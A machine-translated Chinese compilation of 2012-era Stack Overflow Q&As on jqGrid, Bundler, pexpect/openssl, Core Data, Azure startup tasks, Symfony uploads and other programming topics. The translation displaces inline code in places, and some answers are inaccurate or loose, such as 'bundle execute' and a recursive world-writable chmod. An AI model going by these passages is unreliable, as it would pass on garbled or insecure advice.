这可以在 colModel 级别上完成吗？我知道自定义格式化程序，我可以在其中将标题添加到“cellValue”。但我真的不是在寻找这个，因为我已经在使用复杂的自定义格式化程序。

我希望有一个直接的方法来实现这一点。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T12:59:44.700

您可以使用

```
cellattr: function () { return ' title="the tooltip text"'; } 
```

我个人在每个具有`formatter: "checkbox"`. 如果一个人有许多带有复选框的列并查看网格中间的某行，这是非常实用的。在这种情况下，通常很难确定复选框位于哪一列。在这种情况下，上述工具提示非常有用。

就像您看到的`cellattr`那样，它是一个函数，它有一些可选参数：`rowId`、`cellValue`等`rawObject`（参见[文档](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:colmodel_options)）。它允许您创建非常灵活的工具提示文本。

再说一句。[与自定义格式化程序](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:custom_formatter)`cellattr`相比的优点是您可以继续使用[预定义的格式化程序](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:predefined_formatter#predefined_format_types)并仅设置自定义属性，如,等等。因此，您可以在具有、、等格式化程序的列上设置自定义属性。`title``class``select``date``integer``checkbox`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-11T23:49:07.193

要将此功能与 jqGrid 的 asp.net 库一起使用，请将其添加到您的列中。我在网上的其他任何地方都找不到这个记录...

```
<Formatter>
    <trirand:CustomFormatter SetAttributesFunction="clientSideFunctionName" />
</Formatter> 
```

# ruby-on-rails - 如何从 Gemfile.lock 文件安装 gem？

> ID：12215628
> 
> 赞同：12
> 
> 时间：2012-08-31T12:42:33.707
> 
> 标签：ruby-on-rails, ruby-on-rails-3, github

我正在尝试运行从 Github 上取下的应用程序。

我已经运行`bundle install`从`Gemfile`. 但是，在运行应用程序时，一条错误消息告诉我安装的 gem 版本错误。

在检查时，`Gemfile.lock`我注意到版本比安装的 gem 旧。（即我安装了较新版本的 gems 并且应用程序需要较旧的 gems。）

**有没有按照 Gemfile.lock 文件中描述的版本快速安装所有 gem 的方法？或者有没有一种方法可以忽略该文件？**

宝石文件：

```
 source 'http://rubygems.org'
   gem 'rails', "3.0.9"
   gem "sass"
   .. 
```

Gemfile.lock:

```
 sass (3.1.1)
 .. 
```

在上面的示例中，即使安装了 sass，应用程序也特别需要 3.1.1 版本。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-31T13:32:51.937

有了一个有效的`Gemfile.lock`文件，`bundle install`单独使用就足够了，除非某些特定的 gem 版本已经被删除。在这种情况下，您需要寻找当前仍然可用的替代 gem 版本（通常`bundle update name_of_yanked_gem`就足够了）。

关于`sass 3.1.1`，与其说应用程序需要那个特定版本，不如说，`Gemfile.lock`考虑到`Gemfile`. 正如您所列出的，没有为自己指定版本范围，但是如果其他 gem作为依赖`sass`项，它们可能会施加进一步的限制。`sass`

完全忽略`Gemfile.lock`不是一个好主意，因为在正常情况下，它将指定最后一次知道仍可用于应用程序的 gem 版本。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2016-03-19T11:37:09.280

尝试这个 ..

```
bundle install --deployment 
```

使用上述部署选项，bundle 然后从 Gemfile.lock 读取。

更重要的是，gems 被安装到**目录 vendor/bundle**，而 bundle 目录是**自动创建**的。

另外，`.bundle`直接在rails根目录下新建一个目录，里面有一个名为config的文件，其内容如下...

```
BUNDLE_FROZEN: '1'
BUNDLE_PATH: vendor/bundle
BUNDLE_DISABLE_SHARED_GEMS: '1' 
```

希望以上内容对您有用。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-08-31T13:12:03.337

确保您正在运行 Web 服务器`bundle execute rails server`

# python - 使用 pexpect 自动化 openssl req -new -key server.key -out server.csr

> ID：12215635
> 
> 赞同：0
> 
> 时间：2012-08-31T12:43:13.727
> 
> 标签：python, openssl

我正在尝试自动化下面的对话。我不关心第一个密码输入的内容。我很难找到工作。

```
root@ffffff:/home/ubuntu# openssl req -new -key server.key -out server.csr
Enter pass phrase for server.key:
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []: 
```

以下是我的预期代码：

```
 import pexpect
child = pexpect.spawn ('openssl req -new -key server.key -out server.csr')
child.expect ('key*')
child.sendline ('YYYY')
child.expect ("Country Name (2 letter code) [AU]:")
child.sendline ('US')
child.expect ("State or Province Name (full name) [Some-State]:")
child.sendline ('HI')
child.expect ("Locality Name (eg, city) []:")
child.sendline ('US')
child.expect ("Organization Name (eg, company) [Internet Widgits Pty Ltd]:")
child.sendline ('US')
child.expect ("Organizational Unit Name (eg, section) []:")
child.sendline ('US')
child.expect ("Common Name (e.g. server FQDN or YOUR name) []:")
child.sendline ('US')
child.expect ("Email Address []:")
child.sendline ('US')
child.expect ("A challenge password []:")
child.sendline ("yy")
child.expect ("An optional company name []:")
child.sendline ("yy")
child.expect(pexpect.EOF) 
```

以下是我的错误：

```
challenge password []:
An optional company name []:
root@li494-175:/home/ubuntu# clear
root@li494-175:/home/ubuntu# python vv.py
Traceback (most recent call last):
  File "vv.py", line 5, in <module>
    child.expect ("Country Name (2 letter code) [AU]:")
  File "/usr/local/lib/python2.7/dist-packages/pexpect-2.4-py2.7.egg/pexpect.py", line 1316, in expect
    return self.expect_list(compiled_pattern_list, timeout, searchwindowsize)
  File "/usr/local/lib/python2.7/dist-packages/pexpect-2.4-py2.7.egg/pexpect.py", line 1330, in expect_list
    return self.expect_loop(searcher_re(pattern_list), timeout, searchwindowsize)
  File "/usr/local/lib/python2.7/dist-packages/pexpect-2.4-py2.7.egg/pexpect.py", line 1401, in expect_loop
    raise EOF (str(e) + '\n' + str(self))
pexpect.EOF: End Of File (EOF) in read_nonblocking(). Exception style platform.
<pexpect.spawn object at 0x2083850>
version: 2.4 ($Revision: 516 $)
command: /usr/bin/openssl
args: ['/usr/bin/openssl', 'req', '-new', '-key', 'server.key', '-out', 'server.csr']
searcher: searcher_re:
    0: re.compile("Country Name (2 letter code) [AU]:")
buffer (last 100 chars):
before (last 100 chars): p_enc.c:539:
140006640854688:error:0906A065:PEM routines:PEM_do_header:bad decrypt:pem_lib.c:476:

after: <class 'pexpect.EOF'>
match: None 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:11:29.327

你为什么不试试上面的配置文件呢？

openssl req -new -key server.key -out server.csr -config config.txt

[http://webservices.itcs.umich.edu/mediawiki/radmind/index.php/Example_OpenSSL_Configuration_File](http://webservices.itcs.umich.edu/mediawiki/radmind/index.php/Example_OpenSSL_Configuration_File)

# nsmanagedobject - NSManagedObject 零值

> ID：12215649
> 
> 赞同：0
> 
> 时间：2012-08-31T12:44:18.687
> 
> 标签：nsmanagedobject

我用 CoreData 保存数据。我有一个数组，最后一次出现的是 'nil' 值。我不想在 CoreData 中保存 'nil' 值。**我尝试检查 'nil' 值，但我无法实现**。我的代码：

```
for (NSManagedObject *category in array) 
{ 
        //if (![category isEqual:nil]) {     <- FAILED ATTEMPT
        //if (![category isFault]) {           <- FAILED ATTEMPT
        //if (category != NULL) {           <- FAILED ATTEMPT

         [ more Objective-C code ...]

         // Insert Objects in the Core Data
         theLine = [NSEntityDescription insertNewObjectForEntityForName:entName
                                                                          inManagedObjectContext:context];
        //}
  } 
```

我不明白为什么很难检查 NSManagedObject 'nil value'。

在我的代码中，**“类别”**是一个 NSManagedObject。我想知道它何时具有“零”值：

*   (NSManagedObject) **isEqual**
*   (NSManagedObject) **isFault**
*   (NSManagedObject) **= NULL**

这些选项中的任何一个都不会运行。谁能帮我？

提前非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T19:52:30.923

我想如果你只是使用`if(category)`或者`if(category == nil)`他们应该检查它是否等于 nil。

如果做不到这一点，你可以做一个 for 循环，如：

```
for (int cycle =0 ; cycle < [array count]; cycle++){
   if ([[array objectAtIndex:cycle]isKindOfClass[NSNull class]]){

////Do some code here

   }

} 
```

这将检查对象的值是否为 Null，因为您的循环只会查看 NSManagedObjects

# jquery - ipad上的jquery不起作用

> ID：12215651
> 
> 赞同：0
> 
> 时间：2012-08-31T12:44:22.320
> 
> 标签：jquery

这段代码：

```
$('#x').hide();
$('#y').hide();
alert($('#y').is(":visible"));
alert($('#x').is(":visible")); 
```

在 ipad 上时，显示两个警报，它们说的是真的。这怎么可能？在 Chrome 上，它们显示为 false，正如它们应该显示的那样。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:51:27.690

您应该使用回调参数：

```
$('#x').hide(0, function() {
    alert($('#y').is(":visible"));
}); 
```

该函数仅在动画完成时执行。虽然，这应该在没有任何动画的情况下完成......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:47:02.807

我认为 jQuery 在解释下一个代码之前不会等待动画完成。也许 iPad 的解释比隐藏更快，因此这两个元素仍然可见。

您可以使用`window.setTimeout`

# php - 如何为 Active Directory 用户设置 md5 哈希密码

> ID：12215660
> 
> 赞同：1
> 
> 时间：2012-08-31T12:45:17.930
> 
> 标签：php, active-directory

有很多用户的密码存储为 md5 哈希。现在要将所有这些用户添加到 Active Directory。一切都与新用户的 unicode 密码完美配合。但是我们没有旧密码的普通密码。

发现我可以将 md5 散列密码发送到 AD 添加：

```
$user['userPassword'] = '{MD5}'.base64_encode(pack('H*', md5($password))); 
```

但看起来 AD 不理解这种格式。但接受用户创建请求。如果查看用户属性 - 没有 userPassword 之类的属性并在登录时拒绝。

应该如何配置 AD 以接收此类密码并理解它们？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T20:22:33.017

抱歉，AD 本身不支持通过 LDAP 注入像这样的哈希...（另外，您假设 AD 存储它们的方式与您以前的系统完全相同，这可能是也可能不是这种情况）

我可以提出一些方法，但它们都会回到你手中获取非散列密码并通过你已经知道的机制编写它们。

# ios - 谷歌在 ios 中建议类似功能

> ID：12215663
> 
> 赞同：0
> 
> 时间：2012-08-31T12:45:30.077
> 
> 标签：ios

首先，我对 ios 开发非常陌生。不过，我对网络开发非常有经验。

我已经完成了[如何实现“自动完成”功能（如谷歌搜索）](https://stackoverflow.com/questions/6978667/objective-c-how-to-implement-auto-complete-feature-like-google-search)，但不幸的是它只适用于本地数据。

我必须实现类似的功能，但必须从远程服务器获取数据。我将使用[NSURLConnection](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/URLLoadingSystem/Tasks/UsingNSURLConnection.html)。

所以，我有两个问题

1.  解析响应 JSON 并将其显示为文本框下方的列表
2.  列表项必须是可交互的。如果我单击其中任何一个，将检索相应的数据。

对此的任何线索将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:55:12.307

要解析 JSON，您可以使用[JSONKit](https://github.com/johnezang/JSONKit)。它从您的 JSON 数据生成一个 NSDictionary

要访问列表项，请查看下的[UITableViewDelegate](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITableViewDelegate_Protocol/Reference/Reference.html)参考`– tableView:didSelectRowAtIndexPath:`

也许[本教程](http://ygamretuta.me/2011/08/10/ios-implementing-a-basic-search-uisearchdisplaycontroller-and-interface-builder/)将帮助您实现一个 UISearchdispayController，我真的推荐它用于此类功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-20T18:47:11.133

ios5 内置了[对 JSON 的支持。](http://developer.apple.com/library/ios/#documentation/Foundation/Reference/NSJSONSerialization_Class/Reference/Reference.html)它非常易于使用并且是原生的，因此未来的兼容性不是问题。

```
NSDictionary* json = [NSJSONSerialization
                      JSONObjectWithData:responseData
                      options:kNilOptions
                      error:&error]; 
```

# javascript - 声明没有定义的Javascript函数（正文）

> ID：12215664
> 
> 赞同：0
> 
> 时间：2012-08-31T12:45:30.087
> 
> 标签：javascript, function, declaration, definition

我是 javascript 新手，我想知道有没有一种方法可以声明一个函数而不定义它。正如我们在**C**中所做的那样：

```
int sum(int, int); 
```

然后我们可以稍后写它的定义。如：

```
int sum(int A, intB){
    return A+B;
} 
```

我们有没有办法在 javascript 中只声明一个函数而不定义它？

# android - Android NDK：使用 NDK + SDK android 打开写入 SD 卡的文件时出错

> ID：12215665
> 
> 赞同：0
> 
> 时间：2012-08-31T12:45:35.303
> 
> 标签：android, android-ndk-r5

我是 android 新手，我正在尝试使用 NDK 从 SD 卡读取文件并将读取的字节发送到 SDK 并使用 SDK 将其写入 SD 卡（用于检查）。我可以成功地从 NDK 拨打电话 - SDK使用字节，我可以使用 SDK 将其写入 SD 卡。但我无法打开写入 SD 卡的文件。

我正在粘贴我的代码

本机 C 文件

```
#include<stdio.h>
#include<string.h>
#include <jni.h> 
#include <stdlib.h> 
#include <android/log.h>  
#include "com_example_fileupload_NativeLib.h"

#define  LOG_TAG    "testjni" 
#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)  

JavaVM *m_vm; 
jobject obj; 
jclass gFilePermInfoClass;
jmethodID gFilePermInfoClsConstructor;

jint JNI_OnLoad(JavaVM* vm, void* reserved) 
{
     JNIEnv* env;     
    LOGI("JNI INIT");      
    return JNI_VERSION_1_6; 

} 

JNIEXPORT jint JNICALL Java_com_example_fileupload_NativeLib_loop
  (JNIEnv *env, jobject obj)
{

LOGI("JNI work !"); 
jbyteArray data; 
jbyteArray data_rem; 
jclass clazz = (*env)->FindClass(env,"com/example/fileupload/NativeLib"); 
if (clazz == 0) { 
LOGI("FindClass error"); 
return 2; 
} 
gFilePermInfoClass = (*env)->NewGlobalRef(env, clazz);
LOGI("JNI before jmethodID"); 
jmethodID javamethod = (*env)->GetMethodID(env,gFilePermInfoClass, "callFromCPP", "([B)V"); 
gFilePermInfoClsConstructor = (*env)->NewGlobalRef(env, javamethod);
if (javamethod == 0) { 
LOGI("GetMethodID error"); 
return 3; 
} 
LOGI("JNI before calling java ");

LOGI(" before File "); 
FILE *fd = NULL;
    char buff[1*1024*1024];
char *h;
    unsigned int nread = 0;
     unsigned int nread_remaining = 0;
int count=0;
    memset(buff, '\0', sizeof(buff));
    fd = fopen("/sdcard/20MB.zip","r+");
    fseek ( fd, 0 , SEEK_END ); 
    int fileSize = ftell(fd); 
    LOGI("****SUDARSHAN C SIZE %d",fileSize);

    if(NULL == fd) // Check for error
    {
       LOGI("\n File opening failed\n");
        return 1;
    }
    nread = (1*1024*1024); // Hard code the number of elements to 50

    if(nread_remaining = fileSize%nread)
    {
    count = fileSize/nread;
    LOGI("***** IN IF rem %d",nread_remaining);
    }
    else{
    count = fileSize/nread;
    LOGI("***** IN ELSE COUNT  %d",count);
    }

 data = (*env)->NewByteArray(env, nread); 
  data_rem = (*env)->NewByteArray(env, nread_remaining); 
  if(data == NULL){         
  LOGI("No memory could be allocated for buffer");         
  return -1;     
  } 

LOGI("Before While in C "); 
int count_test=0;
int i;
   for(i=count;i>0;i--) //while(count_test) //while( fread(buff, 1, nread, fd) )
    {
        fread(buff, 1, nread, fd);
        LOGI("INSIUDE WHILE SUDARSHAN **** %d",i);
        (*env)->SetByteArrayRegion(env, data, 0, nread, buff);     
        (*env)->CallVoidMethod(env, obj, gFilePermInfoClsConstructor, data); 
    }

    if(nread_remaining){
    char buffer[nread_remaining];
    fread(buffer, 1, nread_remaining, fd);
    (*env)->SetByteArrayRegion(env, data_rem, 0, nread_remaining, buffer);     
    (*env)->CallVoidMethod(env, obj, gFilePermInfoClsConstructor, data_rem); 
    }

    if(feof(fd))
    {
       printf("\n Seems like end of file was reached\n");
    }
    else if(ferror(fd))
    {
       printf("\n Some errors on this stream occurred\n");
    }

    // Reset the buffer with NULLs
    memset(buff, '\0', sizeof(buff));
    return (10+11);
} 
```

NativeLib.java

```
package com.example.fileupload;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import android.os.Environment;

public class NativeLib {

    public int count=0;
    File someFile = null;
    FileOutputStream fos = null;
    File sdDir = new File(Environment.getExternalStorageDirectory().getPath());
    public NativeLib() throws FileNotFoundException{

        someFile = new File(sdDir.getPath() +"/22MB.zip");
        fos = new FileOutputStream(someFile);

        //fos.flush();fos.close();

    }
      static {
        System.loadLibrary("com_example_fileupload_NativeLib");
      }

      /** 
       * Adds two integers, returning their sum
       */
      public native int loop();

      /**
       * Returns Hello World string
     * @throws IOException 
       */
      //public native String hello();

      public void callFromCPP(byte[] buff)
        {  
          count=count+buff.length;
          try {
              //count=count+buff.length;
              System.out.println("************ Sudarshan Inside callfromcpp try "+count+"   "+buff.length);
            fos.write(buff);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            System.out.println("************ Sudarshan Inside callfromcpp catch "+e.toString());
            e.printStackTrace();
        }
         // count=count+buff.length;
          //System.out.println("************ Sudarshan Inside callfromcpp 1 "+buff.toString()+"   "+count); 

        } 
```

我正在调用本机 fn。我的**MainActivity.java**和 java fn 中的**loop() 。**来自本机的调用是**callFromCPP(byte[] buff)**，这里仅将字节写入从本机返回的 SD 卡（名为**22MB.zip**）。

 ******PLZ帮助

问候，

迪帕克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T15:04:11.187

我发现我犯的错误，..“fread”函数读取字节有一个限制..我给了 1MB（我的 c 文件中的 nread 值）太大了..所以我将值更改为 100 和有效

问候，

迪帕克******

# shell - 从命令行更改文件夹权限（在 Mac 上）

> ID：12215668
> 
> 赞同：4
> 
> 时间：2012-08-31T12:45:45.703
> 
> 标签：shell, permissions, permission-denied

我正在尝试编写一个脚本，让我添加到现有的目录结构并将一堆文件复制到其中的各个位置。但是，单独使用`mkdir ...`and`cp...`命令是行不通的，因为我没有这样做的权限。我知道这可以在“获取信息”窗口中手动更改，但此脚本将由其他人运行，其重点是节省时间和麻烦。

有没有办法添加到此脚本以授予我将文件复制到 BASEDIR/SUBDIRS 的权限？

关于我在做什么的更多细节：
我想用一堆 SUBDIRS 添加到目录 BASEDIR 然后将文件复制到这些子目录中。问题是我在`mkdir BASEDIR/SUBDIR1/SUBDIR2`命令之后立即收到这些“权限被拒绝”错误。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T13:39:23.527

该命令
`sudo chmod -R ugo=rwx BASEDIR/`
将所有文件夹权限授予所有用户到 BASEDIR 及其所有子目录

# python - 根据特定日期抓取推特数据

> ID：12215671
> 
> 赞同：2
> 
> 时间：2012-08-31T12:46:04.080
> 
> 标签：python, twitter, python-twitter

我是 twitter Api 的新手，所以我不知道它在更广泛意义上的用途，实际上我正在 Ghaza 上抓取推文以进行分析并抓取它，但只是作为页面中的一个示例，这就是我所做的

```
while(page<=3):
    tweets=api.GetSearch("#Egypt",per_page=100) 
```

现在我想抓取数据，但从特定日期开始，比如我想从 2010 年 2 月 2 日到 2012 年 3 月 7 日抓取它。只要一个线索就足够了，但任何解释都值得赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-01-02T04:55:04.080

使用`[query] since:2014-02-01 until:2014-02-05`（[链接到文档](https://dev.twitter.com/rest/public/search)）

**查询运算符**

```
Operator                    Finds tweets…
...
superhero since:2015-07-19  containing “superhero” and sent since date “2015-07-19” (year-month-day).
ftw until:2015-07-19        containing “ftw” and sent before the date “2015-07-19”.
... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T21:58:51.097

我讨厌承受坏消息，但是当前的[Twitter API](https://dev.twitter.com/docs/api/1.1)或您正在使用的 Python 包装器不支持这种搜索。从有关搜索功能的[文档中：](https://dev.twitter.com/docs/using-search)

> *   Search API 不是所有推文的完整索引，而是最近推文的索引。目前，该索引包括 6-9 天的推文。
> *   你不能使用搜索 API 来查找大约一周前的推文。

我希望这也是可能的，但到目前为止还没有好的解决方案。

# .net - Azure 启动任务挂起

> ID：12215672
> 
> 赞同：4
> 
> 时间：2012-08-31T12:46:04.393
> 
> 标签：.net, azure, windows-server-2008, visual-c++-2012

我有一个具有 MVC4 角色的 Azure 项目，我在其中添加了[Visual C++ 2012 运行时库](http://www.microsoft.com/en-us/download/details.aspx?id=30679)设置文件，以及一个静默安装它的脚本。

脚本工作并且库被安装，唯一的问题是任务永远不会完成并且安装过程永远不会退出，这会阻止角色启动： ![角色实例](../Images/0e59e193603be71a8f264dd797ef2e18.png)

我使用远程桌面连接到服务器，通过查看任务管理器，我可以看到进程**vcredist_x64.exe**：（实际上有 2 个，但我认为这是正常的）

![Windows 服务器任务管理器](../Images/6607096ef39b94c2ca66701c951351ce.png)

当我右键单击并终止该进程时，部署成功完成并启动角色。

当我的启动任务在*ServiceDefinition.csdef中设置为***simple**时，这是一个问题，因为这会使服务器等到任务完成才能启动角色。所以我所做的就是将任务设置为**后台**，这样启动脚本就不会阻止角色启动了，但即便如此，该进程仍在后台运行，必须手动终止。

 ***该脚本应该可以工作，并且以前使用过 2010 VC++ 库（虽然没有 EXIT，但应该存在以避免在脚本返回错误代码时阻止角色）：

```
vcredist_x64.exe /quiet /norestart
EXIT /B 0 
```

没用，所以我想我会在安装后手动终止该进程：

```
vcredist_x64.exe /quiet /norestart
TASKKILL /F /T /IM vcredist_x64.exe
EXIT /B 0 
```

没有工作，过程仍然存在。如果我自己在服务器上或本地手动运行该脚本实际上可以工作，但是当 Azure 在部署期间尝试执行此操作时，它会挂起。

我的启动任务在 ServiceDefinition.csdef 中定义如下：

```
<Startup>
  <Task commandLine="InstallVcRedist.cmd" executionContext="elevated" taskType="background" />
</Startup> 
```

登录`C:\Resources\temp\{RoleId.RoleName}\RoleTemp`说一切顺利。

我可以通过将启动任务设置为后台而不是简单来避免角色被阻止，但这并不能真正解决问题。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-03T14:21:18.627

多亏了史蒂夫·马克思的[这篇博文，我才知道为什么会发生这种情况。](http://blog.smarx.com/posts/introduction-to-windows-azure-startup-tasks)

此问题仅在 Windows Server 2008 **SP2**中出现，因此我不得不将主机更改为 Windows Server 2008 **R2**。
这可以通过在所有**ServiceConfiguration**`osFamily="1"`文件中更改为来完成，或者可以通过单击服务然后在顶部的*配置操作系统从 Azure 门户进行更改。*`osFamily="2"`

 **** * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-02T06:39:01.533

我也需要使用这个库。这是我的脚本：

```
start /w
cd startup
vcredist_x64.exe /q /norestart

exit /b 0 
```

它对我有用 - 启动是我保存 vcredist_x64.exe 的地方。

在我的 servicedefinition 文件中，这是 xml 行

```
 <Task commandLine="startup\InstallVcreditst.cmd" executionContext="elevated" taskType="simple" /> 
```******

# php - 访问 PHP 数组对象受保护的属性

> ID：12215675
> 
> 赞同：5
> 
> 时间：2012-08-31T12:46:14.093
> 
> 标签：php, symfony, symfony-forms

我正在尝试在 Symfony2 中上传多个文件。我正在尝试访问以下请求对象，但无法获取参数属性。我如何一一获取文件以上传它们。

我得到的错误：

> 致命错误：无法访问第 66 行 /var/www/File/src/Webmuch/FileBundle/Entity/File.php 中的受保护属性 Symfony\Component\HttpFoundation\FileBag::$parameters

请求对象：

```
Symfony\Component\HttpFoundation\FileBag Object
(
    [parameters:protected] => Array
        (
            [file] => Array
                (
                    [0] => Symfony\Component\HttpFoundation\File\UploadedFile Object
                        (
                            [test:Symfony\Component\HttpFoundation\File\UploadedFile:private] => 
                            [originalName:Symfony\Component\HttpFoundation\File\UploadedFile:private] => FLB1.jpg
                            [mimeType:Symfony\Component\HttpFoundation\File\UploadedFile:private] => image/jpeg
                            [size:Symfony\Component\HttpFoundation\File\UploadedFile:private] => 13584
                            [error:Symfony\Component\HttpFoundation\File\UploadedFile:private] => 0
                            [pathName:SplFileInfo:private] => /tmp/phpzdaQgW
                            [fileName:SplFileInfo:private] => phpzdaQgW
                        )

                    [1] => Symfony\Component\HttpFoundation\File\UploadedFile Object
                        (
                            [test:Symfony\Component\HttpFoundation\File\UploadedFile:private] => 
                            [originalName:Symfony\Component\HttpFoundation\File\UploadedFile:private] => FLB2.gif
                            [mimeType:Symfony\Component\HttpFoundation\File\UploadedFile:private] => image/gif
                            [size:Symfony\Component\HttpFoundation\File\UploadedFile:private] => 5193
                            [error:Symfony\Component\HttpFoundation\File\UploadedFile:private] => 0
                            [pathName:SplFileInfo:private] => /tmp/phpNUXho7
                            [fileName:SplFileInfo:private] => phpNUXho7
                        )

                )

        )

) 
```

请帮我弄清楚这个对象访问。另外，如果有人有更好的方法在 Symfony2 中上传文件。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T13:13:09.813

要访问文件，您可以执行以下操作

```
// retrieves an instance of UploadedFile
$request->files->get('file'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-11-30T16:45:16.993

我认为您正在尝试直接访问该属性。您必须使用现有的 getter 和 setter [1](http://api.symfony.com/2.0/Symfony/Component/HttpFoundation/File/UploadedFile.html#method_move)

这应该返回文件名：

```
// retrieves an instance of UploadedFile
$file = $request->files->get('file');
$file_name = $file->getClientOriginalName(); 
```

# php - 重定向到同一页面以锚定

> ID：12215676
> 
> 赞同：14
> 
> 时间：2012-08-31T12:46:15.290
> 
> 标签：php, redirect

需要从[http://sitename.com/cat/index.php](http://sitename.com/cat/index.php)重定向到[http://sitename.com/cat/index.php#anchor](http://sitename.com/cat/index.php#anchor)

我尝试了 2 种方法：php 重定向和元刷新

**PHP 重定向**

```
<?php
    $URL = "http://sitename.com/cat/index.php#anchor";
    header("Location: $URL");
?>
<html>
.... 
```

**元刷新**

```
<html>
    <head>
    ... 
    <meta http-equiv="refresh" content="0;url=http://sitename.ru/cat/index.php#anchor">
    ...
    </head>
...
</html> 
```

结果是两种方式我都有循环页面刷新。

**如何正确解决这个问题？**

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T13:00:20.340

您不需要重定向页面，只需设置`window.location.hash`.

```
window.location.hash="anchor"; 
```

# c# - 我在datagridview中添加了更新按钮，当在c#中单击按钮时如何更改其上的文本？

> ID：12215677
> 
> 赞同：0
> 
> 时间：2012-08-31T12:46:27.877
> 
> 标签：c#, text, datagridview

我正在用 c# 开发一个 Windows 应用程序。我使用以下代码在 datagridview 内创建了一个按钮

```
 DataGridViewButtonColumn btn = new DataGridViewButtonColumn();
  dataGridViewTrial.Columns.Add(btn);
  btn.HeaderText = "Update";
  btn.Name = "btn";
  btn.Text = "Update";
  btn.UseColumnTextForButtonValue = true; 
```

现在我想在单击更新按钮时将 btn 的文本更改为“保存”。我也想更新我的表格。我没有得到它。请帮助我:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:56:54.203

如果我没记错你应该这样做

```
 //Here you add event to button
    void dataGridView1_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
    {
        if (e.Control is Button)
        {
            Button btn = e.Control as Button;
            btn.Click -= new EventHandler(btn_Click);
            btn.Click += new EventHandler(btn_Click);
        }
    }

    void btn_Click(object sender, EventArgs e)
    {
        if(sender is button)
            ((button)sender).Text = "new text";
    } 
```

我希望这有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:57:33.417

```
void dataGridView1_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
            {
                if (e.Control is Button)
                {
                    Button btn = e.Control as Button;

                    // hook or unhook click event here
                }
            } 
```

# php - 在 PHP Web 应用程序中存储和显示的有效方式

> ID：12215679
> 
> 赞同：0
> 
> 时间：2012-08-31T12:46:36.577
> 
> 标签：php, web-applications, web, content-management-system

我正在开发一个 PHP Web 应用程序。寻找存储用户上传图像并将其显示在 Web 应用程序上的有效方法。请让我知道你的建议。

预期图像数量为 100 万张。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:55:34.750

我的建议是结合使用文件系统存储和数据库存储。创建一个表格，其中将包含有关图像的元数据（上传者的用户 ID 等），并包含图像 URL 的字段。

当有人上传图像时，将文件移动到可从 Web 访问的目录，然后在您创建的表中存储一条记录，其中包含有关上传文件的所有相关数据，包括图像的 URL。这样，您可以查询数据库以获取有关图像的信息，但您不必将文件的内容存储在数据库中。

# c++ - 与静态 c 运行时链接时内存分配/释放时的问题

> ID：12215681
> 
> 赞同：2
> 
> 时间：2012-08-31T12:46:40.720
> 
> 标签：c++, c, visual-c++

我在 Jeffrey Richter 和 Christophe Nasarre 所著的 Windows via C-C++ 一书中看到了下面的注释。

检查以下代码：V

```
OID EXEFunc() {
PVOID pv = DLLFunc();
// Access the storage pointed to by pv...
// Assumes that pv is in EXE's C/C++ run-time heap
free(pv);
}
PVOID DLLFunc() {
// Allocate block from DLL's C/C++ run-time heap
return(malloc(100));
} 
```

所以你怎么看？前面的代码能正常工作吗？DLL 函数分配的块是否被 EXE 函数释放？答案是：也许。显示的代码没有为您提供足够的信息。如果 EXE 和 DLL 都链接到 DLL C/C++ 运行时库，则代码可以正常工作。但是，如果其中一个或两个模块链接到静态 C/C++ 运行时库，则对 free 的调用将失败。

我无法理解为什么在将模块与静态 C 运行时链接时调用 free 会失败。

有人可以解释为什么免费失败吗？在这里找到了类似的问题： [C运行时的静态与动态链接中的内存分配](https://stackoverflow.com/questions/8157891/memory-allocation-in-static-vs-dynamic-linking-of-c-runtime)

但是我在这里和 MrPhilTx 有同样的疑问：不是所有的堆都在同一个地址空间中吗？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T16:55:57.370

